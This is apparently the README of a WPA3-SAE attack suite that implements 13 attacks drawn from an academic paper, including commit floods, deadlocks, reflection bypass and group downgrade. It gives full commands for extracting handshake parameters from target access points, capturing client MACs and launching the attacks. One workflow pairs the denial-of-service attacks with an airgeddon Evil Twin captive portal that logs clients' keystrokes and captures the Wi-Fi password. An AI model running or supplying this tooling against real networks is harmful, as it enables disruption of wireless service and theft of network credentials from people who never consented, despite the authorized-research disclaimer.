# WPA3-SAE Formal Attack Suite (v2)

> ⚠️ **FOR AUTHORIZED RESEARCH & ISOLATED TEST ENVIRONMENTS ONLY**  
> Using this software against unauthorized networks violates computer crime laws.

## Overview

This suite implements **13 formal attacks against the WPA3 SAE (Simultaneous Authentication of Equals)** handshake protocol, based on the academic paper:

> *"What a Mesh: Formal Security Analysis of WPA3 SAE Wireless Authentication"*  
> Metere et al., arXiv:2603.23352v1, 2026  
> Errata: IEEE 802.11-24/0027r0-r2 & 0744r1 (Accepted Patches)

The suite is designed for **security researchers, Wi-Fi protocol engineers, and penetration testers** conducting authorized assessments of WPA3-capable access points across **2.4 GHz, 5 GHz, and 6 GHz**.

---

## 🆕 What's New in v2

* **Automated JSON Parameter Workflow (`sae_params.json`)**: Extracted scalars, finite field elements, and known client MACs across multiple bands (`5GHz`, `2.4GHz`, `6GHz`) are automatically merged into `sae_params.json` and dynamically injected via `--sae-file sae_params.json` without manual copy-pasting.
* **Multi-Group & Tri-Band Support (Groups 19–24 | 2.4 / 5 / 6 GHz)**: Full support for ECC and FFC groups (19–24) and frequency-based channel switching (`iw dev <iface> set freq <MHz>`) including mandatory 6 GHz Hash-to-Element (`sae_pwe=1` / H2E).
* **IEEE 802.11-2020 Protocol Fixes**:
  * Proper 3-byte Element ID Extension header (`[255, len + 1, 33]`) for Password Identifier IEs (`unknown_pw_id`, `simultaneous_pw_id_conflict`).
  * Guaranteed Locally Administered Unicast MAC generation (`Bit 0 = 0`, `Bit 1 = 1`) to prevent early MAC-layer frame drops.
  * True peer-commit reflection ($c_L = c_R$) in `reflection_attack`.
* **Persistent L2 Sockets**: Eliminates per-burst Linux kernel `synchronize_net()` stalls for maximum packet throughput.
* **airgeddon Auto-Close Integration**: Real-time companion monitor (`watch_pass_auto_close_en.sh`) that tracks airgeddon Captive Portal activity and gracefully stops `wpa3_sae_formal_attacks_auto_close_v2_en.py` via `SIGTERM` as soon as the valid password is captured.

---

## Repository Structure

| File | Description |
|---|---|
| `sae_extractor_arxiv_all_groups_v2.py` | Extracts valid SAE scalars and finite elements (Groups 19–24) directly from `wpa_supplicant` debug logs and merges them into `sae_params.json`. |
| `capture_known_macs_v2.py` | Triggers and captures valid Unicast STA MAC addresses from incomplete SAE handshakes (for `memory_exhaustion` / `unknown_pw_id`) and updates `sae_params.json`. |
| `wpa3_sae_formal_attacks_v2.py` | Main attack suite implementing all 13 formal attacks, background channel tracking, and `--sae-file` loading. |
| `wpa3_sae_formal_attacks_auto_close_v2_en.py` | Modified attack suite featuring an external `SIGTERM` orchestrator shutdown handler for automated termination via the airgeddon monitor. |
| `watch_pass_auto_close_en.sh` | Live monitor for airgeddon Captive Portal attacks with audio alerts, desktop notifications, and automatic shutdown of the Python attack suite upon password capture. |

---

## Implemented Attacks

| # | Attack Name | Type | Paper Reference |
|---|---|---|---|
| 1 | `commit_flood` | DoS (Cookie Guzzler) | §VI-B |
| 2 | `reflection_attack` | Auth Bypass | §VI-A, Erratum #23 |
| 3 | `memory_exhaustion` | Resource DoS | §VI-B, Erratum #5 |
| 4 | `deadlock` | State Machine Deadlock | §VI-B, Errata #16, #17 |
| 5 | `zero_scalar` | Cryptographic Weakness | §12.4.5.4 |
| 6 | `invalid_curve` | Information Leak | §12.4.5.4 |
| 7 | `downgrade` | Group Downgrade | §12.4.8.6.4, Erratum #19 |
| 8 | `open_auth` | Legacy DoS | IEEE 802.11 |
| 9 | `unknown_pw_id` | Memory DoS / Stall | §VI-C, Errata #1, #16 |
| 10 | `simultaneous_pw_id_conflict` | Non-termination Loop | §VI-C-1, Erratum #A |
| 11 | `group_mismatch_tiebreaker_deadlock` | State Machine Deadlock | §VI-C-3, Erratum #M |
| 12 | `threshold_boundary` | Spec Flaw / DoS | §12.4.6, App.B.C |
| 13 | `silent_discard` | Error Handling Test | §12.4.8.6.3, App.B.K |

---

## Requirements

* Linux with root privileges (`sudo`)
* Python 3.8+
* Monitor-mode capable Wi-Fi adapter(s)
* **`wpa_supplicant` v2.11** (required by `sae_extractor_arxiv_all_groups_v2.py` for multi-group extraction across Groups 19–24)

### Install Dependencies

```bash
pip install scapy
sudo apt install iw iproute2 wireless-tools aircrack-ng sox pulseaudio-utils libnotify-bin
```

---

## 🚀 Step-by-Step Usage Guide

### Step 1: Extract SAE Parameters (`sae_extractor_arxiv_all_groups_v2.py`)

Use a standard **Managed Mode** Wi-Fi interface (e.g., `wlan0`) to extract valid cryptographic SAE pairs across Groups 19–24 for your target AP.

> 💡 **Note:** For several attacks—such as `group_mismatch_tiebreaker_deadlock`, `zero_scalar`, `invalid_curve`, or `open_auth`—pre-extracted SAE parameters are **not** required!

1. **Run extraction for the 5 GHz band first:**

   ```bash
   sudo python3 sae_extractor_arxiv_all_groups_v2.py \
       --iface wlan0 \
       --ssid "Target_SSID" \
       --bssid "AA:BB:CC:DD:EE:11" \
       --band 5GHz \
       --channel 36
   ```

   Once completed, the script writes the extracted 5 GHz parameters to `sae_params.json`.

2. **Run extraction for the 2.4 GHz band next:**

   Run the script again in the same directory for the 2.4 GHz band:

   ```bash
   sudo python3 sae_extractor_arxiv_all_groups_v2.py \
       --iface wlan0 \
       --ssid "Target_SSID" \
       --bssid "AA:BB:CC:DD:EE:12" \
       --band 2.4GHz \
       --channel 6
   ```

   **Note:** The existing `sae_params.json` is **not** overwritten; the script automatically merges the `2.4GHz` data alongside the `5GHz` data in `sae_params.json` (and `6GHz` if run for 6 GHz).

3. **Optional – Capture Known Client MACs (`capture_known_macs_v2.py`):**

   To populate `known_macs` for `memory_exhaustion` or `unknown_pw_id`, run:

   ```bash
   sudo python3 capture_known_macs_v2.py \
       --monitor-iface wlan0mon \
       --managed-iface wlan1 \
       --ssid "Target_SSID" \
       --bssid "AA:BB:CC:DD:EE:11" \
       --band 5GHz \
       --channel 36
   ```

   This automatically appends the captured MAC list to `sae_params.json`.

---

### Step 2: Configure Target BSSIDs & Monitor Interfaces

Place your attack adapter(s) into monitor mode (e.g., `sudo airmon-ng start wlan1`) and verify your target BSSIDs and adapter mapping inside `wpa3_sae_formal_attacks_v2.py` (or `wpa3_sae_formal_attacks_auto_close_v2_en.py`):

```python
TARGET_BSSID_5GHZ   = "AA:BB:CC:DD:EE:11"
TARGET_BSSID_2_4GHZ = "AA:BB:CC:DD:EE:12"

SCANNER_INTERFACE     = "wlan0mon"  # Optional background channel tracker (leave "" for manual channel)
MANUAL_CHANNEL_5GHZ   = ""          # Set channel (e.g., "36") if SCANNER_INTERFACE is disabled
MANUAL_CHANNEL_2_4GHZ = ""          # Set channel (e.g., "6") if SCANNER_INTERFACE is disabled

ADAPTER_CONFIGURATION = {
    "wlan1mon": {"band": "5GHz",   "attack": "group_mismatch_tiebreaker_deadlock"},
    "wlan2mon": {"band": "2.4GHz", "attack": "group_mismatch_tiebreaker_deadlock"}
}
```

---

### Step 3: Launch the Attack Suite (`wpa3_sae_formal_attacks_v2.py`)

Run the main script with `--sae-file sae_params.json`. All extracted scalars, finite elements, and known MACs are automatically injected into the attack engine:

```bash
sudo python3 wpa3_sae_formal_attacks_v2.py --sae-file sae_params.json
```

**Additional CLI Override & Help Examples:**

```bash
# Display the full attack encyclopedia:
python3 wpa3_sae_formal_attacks_v2.py --help
```

---

### Step 4 (Optional): airgeddon Captive Portal + Auto-Close Workflow

When pairing the WPA3-SAE DoS suite with an **airgeddon Evil Twin Captive Portal**, you can use the auto-close workflow to automatically terminate the Python attack as soon as a client submits the valid password:

1. **Start airgeddon Captive Portal:**

   Launch airgeddon and set up your Evil Twin Captive Portal attack until the portal is actively running.

2. **Start the Live Monitor (Terminal 1):**

   Make `watch_pass_auto_close_en.sh` executable and run it:

   ```bash
   chmod +x watch_pass_auto_close_en.sh
   ./watch_pass_auto_close_en.sh
   ```

   *(Make sure `PW_OUTPUT_DIR` inside `watch_pass_auto_close_en.sh` points to your `airgeddon/plugins/output` directory).*

3. **Start the Auto-Close Attack Script (Terminal 2):**

   Launch the auto-close version of the attack suite with `sae_params.json`:

   ```bash
   sudo python3 wpa3_sae_formal_attacks_auto_close_v2_en.py --sae-file sae_params.json
   ```

**How it works:**

* `watch_pass_auto_close_en.sh` monitors new DHCP clients (`[CLIENT]`), live portal keystrokes (`[INPUT]`), and failed password attempts (`[ATTEMPT]`) with audio alerts.
* Once airgeddon writes the verified password to the output file, the monitor displays `[HIT]`, triggers a desktop notification, sends `SIGTERM` to `wpa3_sae_formal_attacks_auto_close_v2_en.py` for a clean shutdown, and exits automatically.

---

## References

* Metere et al. (2026): *"What a Mesh: Formal Security Analysis of WPA3 SAE Wireless Authentication"*, arXiv:2603.23352v1
* Vanhoef & Ronen (2020): *"Dragonblood: Analyzing the Dragonfly Handshake of WPA3 and EAP-pwd"*
* IEEE Std 802.11-2020, §12.4 (SAE Authentication)
* IEEE 802.11-24/0027r0-r2, 0744r1 (Accepted Errata)
